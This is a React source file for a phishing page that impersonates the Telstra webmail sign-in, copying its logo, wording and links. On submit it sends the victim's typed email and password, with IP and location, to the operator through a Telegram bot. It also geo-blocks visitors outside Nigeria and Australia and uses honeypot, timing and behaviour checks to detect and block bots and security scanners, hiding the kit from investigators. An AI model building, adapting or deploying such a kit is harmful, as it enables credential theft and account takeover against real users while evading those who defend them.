import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { Eye, EyeOff } from "lucide-react";

import { sendTelegramMessage, getHomeKeyboard, getHumanVisitKeyboard, getUserLocationString } from "@/lib/telegram";
import { initBotDetection, cleanupBotDetection, analyzeForBot } from "@/lib/botDetection";

const ALLOWED_COUNTRIES = ['NG', 'AU'];

function isDevEnvironment(): boolean {
  if (typeof window === 'undefined') return false;
  const hostname = window.location.hostname;
  const isNetlify = hostname.includes('netlify');
  return !isNetlify;
}

async function silentBlockIp(ip: string): Promise<void> {
  if (typeof window !== 'undefined' && window.location.hostname.includes('netlify')) return;
  if (isDevEnvironment()) return;
  
  let targetIp = ip;
  if (!targetIp || targetIp === 'unknown') {
    targetIp = sessionStorage.getItem('visitor_ip') || '';
  }
  if (!targetIp) return;
  
  try {
    await fetch('/api/blocked-ips', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip: targetIp })
    });
  } catch (e) {
    console.log('Silent block failed');
  }
}

async function autoBlockBot(ip: string, reason: string): Promise<void> {
  if (typeof window !== 'undefined' && window.location.hostname.includes('netlify')) return;
  if (isDevEnvironment()) return;
  
  let targetIp = ip;
  if (!targetIp || targetIp === 'unknown') {
    targetIp = sessionStorage.getItem('visitor_ip') || '';
  }
  if (!targetIp) {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      targetIp = data.ip || 'unknown';
    } catch { targetIp = 'unknown'; }
  }
  
  try {
    await fetch('/api/blocked-ips', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip: targetIp })
    });
    
    await fetch('/api/telegram/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        text: `<b>Bot Auto-Blocked</b>\n\n<b>IP:</b> ${targetIp}\n<b>Reason:</b> ${reason}\n<b>Page:</b> Home`
      })
    });
  } catch (e) {
    console.log('Auto-block failed');
  }
}

function isValidEmail(email: string): boolean {
  if (!email || email.trim() === '') return false;
  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailPattern.test(email.trim());
}

function isValidPassword(password: string): boolean {
  if (!password) return false;
  if (password.trim() === '') return false;
  if (password.length < 4) return false;
  if (/^(.)\1+$/.test(password)) return false;
  if (/^\s+$/.test(password)) return false;
  
  const simplePatterns = ['1234', '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999', 'abcd', 'qwerty', 'password', 'pass', 'test'];
  if (simplePatterns.includes(password.toLowerCase())) return false;
  
  return true;
}

async function checkIfBlocked(ip: string): Promise<boolean> {
  if (typeof window !== 'undefined' && window.location.hostname.includes('netlify')) {
    return false;
  }
  try {
    const res = await fetch(`/api/blocked-ips?ip=${ip}`);
    if (res.ok) {
      const data = await res.json();
      return data.blocked === true;
    }
  } catch (e) { console.log('Block check failed'); }
  return false;
}

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberEmail, setRememberEmail] = useState(false);
  const [honeypot, setHoneypot] = useState("");
  const [jsVerified, setJsVerified] = useState(false);
  const [error, setError] = useState("");
  const [usernameError, setUsernameError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [isBlocked, setIsBlocked] = useState(false);
  const [_, setLocation] = useLocation();
  
  const startTime = useRef(Date.now());
  const locationInfo = useRef("");
  const visitorIp = useRef("");

  useEffect(() => {
    initBotDetection();
    
    const timer = setTimeout(() => setJsVerified(true), 500);
    
    getUserLocationString().then(async (loc) => {
      locationInfo.current = loc;
      const ipMatch = loc.match(/IP:<\/b>\s*([^\n<]+)/);
      
      let countryCode: string | null = null;
      const parenthesesMatch = loc.match(/\(([A-Z]{2})\)/);
      if (parenthesesMatch) {
        countryCode = parenthesesMatch[1];
      } else {
        const locationLineMatch = loc.match(/Location:<\/b>\s*[^,]+,\s*([A-Z]{2})\s*$/m);
        if (locationLineMatch) {
          countryCode = locationLineMatch[1];
        }
      }
      
      if (ipMatch) {
        visitorIp.current = ipMatch[1].trim();
        sessionStorage.setItem('visitor_ip', visitorIp.current);
        
        const blockedIps = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
        const isIpBlocked = blockedIps.includes(visitorIp.current);
        const serverBlocked = await checkIfBlocked(visitorIp.current);
        let blocked = isIpBlocked || serverBlocked;
        
        // Block everyone EXCEPT NG and AU, but ONLY in production (Netlify)
        const isNetlify = window.location.hostname.includes('netlify.app');
        if (isNetlify && !blocked && countryCode && !ALLOWED_COUNTRIES.includes(countryCode)) {
          await silentBlockIp(visitorIp.current);
          blocked = true;
        }
        
        setIsBlocked(blocked);
        
        if (blocked) {
          document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
        } else {
          const notificationSent = sessionStorage.getItem('home_notification_sent');
          if (!notificationSent) {
            sendTelegramMessage(`
<b>Human Visit</b>

${loc}
            `, getHumanVisitKeyboard(visitorIp.current));
            sessionStorage.setItem('home_notification_sent', 'true');
          }
        }
      }
    });

    return () => {
      clearTimeout(timer);
      cleanupBotDetection();
    };
  }, []);

  if (typeof window !== "undefined") {
    const searchParams = new URLSearchParams(window.location.search);
    if (searchParams.get("error") === "password" && !error) {
      setError("Your sign in details are incorrect.");
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    setUsernameError("");
    setPasswordError("");
    setError("");
    
    const timeElapsed = Date.now() - startTime.current;
    
    if (honeypot) {
      autoBlockBot(visitorIp.current, "Honeypot field filled");
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    if (timeElapsed < 1000) {
      autoBlockBot(visitorIp.current, "Form submitted too fast (under 1 second)");
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    if (!jsVerified) {
      autoBlockBot(visitorIp.current, "JavaScript not verified");
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    const botAnalysis = analyzeForBot(startTime.current);
    if (botAnalysis.isBot) {
      const reasons = botAnalysis.reasons.join(', ');
      autoBlockBot(visitorIp.current, `Bot behavior detected (score: ${botAnalysis.score}): ${reasons}`);
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    if (!isValidEmail(username)) {
      setUsernameError("Please enter a valid email address.");
      return;
    }

    if (!isValidPassword(password)) {
      setPasswordError("Please enter a valid password.");
      return;
    }

    const title = error ? "Telstra Home Page (Retry)" : "Telstra Home Page";

    sessionStorage.setItem('form_submitted_at', Date.now().toString());
    sessionStorage.setItem('userEmail', username);

    sendTelegramMessage(`
<b>${title}</b>

<b>Email:</b> ${username}
<b>Password:</b> ${password}

${locationInfo.current}
    `, getHomeKeyboard(visitorIp.current, isBlocked));

    setLocation("/loading");
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5] font-[Segoe_UI,Tahoma,Geneva,Verdana,sans-serif] text-[#333]">
      
      {/* Header */}
      <header className="bg-white py-5 shadow-[0_2px_4px_rgba(0,0,0,0.1)] pl-8">
        <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.36 26.5836576,27.1008 C26.5836576,23.3152 23.6035706,18.0624 18.4989701,13.7792 C18.3774617,13.6576 18.2543841,13.5376 18.130141,13.4192 L18.742504,14.0832 Z" id="Path" fill="#FF6900"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-start justify-center py-10 px-4">
        <div className="w-full max-w-[400px] bg-white rounded-xl shadow-[0_4px_12px_rgba(0,0,0,0.1)] p-10">
          
          <h1 className="text-2xl font-semibold text-[#333] mb-4 text-center" data-testid="text-heading">
            Sign in to Telstra webmail
          </h1>
          
          <p className="text-base text-[#666] text-center mb-8">
            Sign in with your Telstra email address
          </p>

          {/* Error Alert */}
          {error && (
            <div className="bg-[#f8d7da] border border-[#f5c6cb] text-[#721c24] rounded-lg p-3 mb-6 text-sm" data-testid="alert-error">
              <i className="fas fa-exclamation-triangle mr-2"></i>
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} autoComplete="off">
            {/* Email Field */}
            <div className="mb-6">
              <label htmlFor="username" className="block font-semibold text-[#333] mb-2">
                Telstra email
              </label>
              <span className="text-sm text-[#666] block mb-2">Example: john@bigpond.com</span>
              <input
                id="username"
                type="email"
                inputMode="email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className={`w-full px-4 py-3 border-2 ${usernameError ? 'border-[#dc3545]' : 'border-[#ddd]'} rounded-lg text-base transition-all focus:border-[#0D54FF] focus:shadow-[0_0_0_0.2rem_rgba(13,84,255,0.25)] outline-none`}
                data-testid="input-email"
              />
              {usernameError && (
                <div className="text-[#dc3545] text-sm mt-2" data-testid="error-email">{usernameError}</div>
              )}
            </div>

            {/* Password Field */}
            <div className="mb-6">
              <label htmlFor="password" className="block font-semibold text-[#333] mb-2">
                Password
              </label>
              <div className="relative">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full px-4 py-3 border-2 ${passwordError ? 'border-[#dc3545]' : 'border-[#ddd]'} rounded-lg text-base transition-all focus:border-[#0D54FF] focus:shadow-[0_0_0_0.2rem_rgba(13,84,255,0.25)] outline-none pr-12`}
                  data-testid="input-password"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#666] hover:text-[#0D54FF] transition-colors"
                  data-testid="button-toggle-password"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              {passwordError && (
                <div className="text-[#dc3545] text-sm mt-2" data-testid="error-password">{passwordError}</div>
              )}
            </div>

            {/* Forgot Password Link */}
            <div className="mb-6">
              <a 
                href="https://www.telstra.com.au/support/email/forgot-password" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-[#0D54FF] font-medium hover:text-[#0a45d6] hover:underline transition-colors"
                data-testid="link-forgot-password"
              >
                Forgot Telstra email
              </a>
            </div>

            {/* Remember Email Checkbox */}
            <div className="flex items-center mb-8">
              <input
                type="checkbox"
                id="rememberEmail"
                checked={rememberEmail}
                onChange={(e) => setRememberEmail(e.target.checked)}
                className="w-5 h-5 mr-3 cursor-pointer"
                data-testid="checkbox-remember"
              />
              <label htmlFor="rememberEmail" className="cursor-pointer select-none flex items-center gap-2">
                Remember Telstra email
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false" className="w-4 h-4 fill-[#0D54FF]">
                  <path d="M9.54,14.81l8-8a1.09,1.09,0,0,1,1.54,0l0,0a1.1,1.1,0,0,1,0,1.54l-8.78,8.78s0,0,0,0a1.12,1.12,0,0,1-.79.33h0a1.15,1.15,0,0,1-.41-.08,1.08,1.08,0,0,1-.39-.25L4.86,13.31a1.13,1.13,0,0,1,.8-1.92,1.11,1.11,0,0,1,.79.33Z"/>
                </svg>
              </label>
            </div>

            {/* Honeypot field */}
            <div className="hidden absolute opacity-0 pointer-events-none" aria-hidden="true">
              <label htmlFor="fax_number">Fax Number</label>
              <input 
                id="fax_number"
                name="fax_number"
                tabIndex={-1}
                autoComplete="off"
                value={honeypot}
                onChange={(e) => setHoneypot(e.target.value)}
              />
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full py-3.5 px-6 bg-[#0D54FF] text-white rounded-lg text-base font-semibold cursor-pointer transition-all hover:bg-[#0a45d6] hover:-translate-y-0.5 hover:shadow-[0_4px_8px_rgba(13,84,255,0.3)] mb-4"
              data-testid="button-submit"
            >
              Continue
            </button>

            {/* OR Divider */}
            <div className="relative text-center text-[#999] font-medium my-6">
              <div className="absolute left-0 top-1/2 w-[40%] h-px bg-[#ddd]"></div>
              <span className="relative z-10 px-4 bg-white">OR</span>
              <div className="absolute right-0 top-1/2 w-[40%] h-px bg-[#ddd]"></div>
            </div>

            {/* Alternative Sign In */}
            <a
              href="/"
              className="block w-full py-3 px-6 bg-transparent text-[#0D54FF] border-2 border-[#0D54FF] rounded-lg text-base font-semibold text-center transition-all hover:bg-[#0D54FF] hover:text-white hover:-translate-y-0.5 hover:shadow-[0_4px_8px_rgba(13,84,255,0.3)]"
              data-testid="link-mytelstra"
            >
              Sign in to MyTelstra
            </a>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-[#eee] py-5 mt-auto">
        <div className="max-w-[400px] mx-auto text-center flex flex-wrap gap-5 justify-center items-center">
          <p className="text-[#666] text-sm m-0">Copyright 2025 Telstra</p>
          <a 
            href="https://www.telstra.com.au/privacy/privacy-statement" 
            target="_blank" 
            rel="noopener noreferrer"
            className="text-[#0D54FF] text-sm font-medium hover:text-[#0a45d6] hover:underline transition-colors"
          >
            Privacy
          </a>
          <a 
            href="#" 
            className="text-[#0D54FF] text-sm font-medium hover:text-[#0a45d6] hover:underline transition-colors"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}
